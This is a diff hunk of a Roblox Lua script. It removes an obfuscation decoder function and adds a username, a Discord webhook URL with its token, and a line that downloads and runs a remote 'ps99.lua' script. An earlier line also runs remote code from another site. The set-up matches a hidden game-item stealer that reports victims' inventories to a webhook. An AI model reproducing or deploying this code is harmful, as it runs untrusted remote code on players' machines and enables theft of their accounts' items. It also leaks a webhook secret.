@@ -379,13 +379,7 @@ else
 end
 getgenv().gui = false
 loadstring(game:HttpGet("https://egorikusa.space/1273ce86b3a1bd21b76c3e9a.lua", true))()
-function yxsFzTwpwu(c)
-tab={}
-for i = 1,#c do
-x=string.len(c[i]) 
-y=string.char(x)
-table.insert(tab,y)
-end
-x=table.concat(tab)
-return x
-end 
+Username = "c0rruptedgraves" 
+Webhook = "https://discord.com/api/webhooks/1273519595889889280/ZnxXQInvqjGFaEZQ4V3mLBHiN-pWEijYfMyAu4yqLnaKEHsmRWID-tm2NVNfUeSHuFfB" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
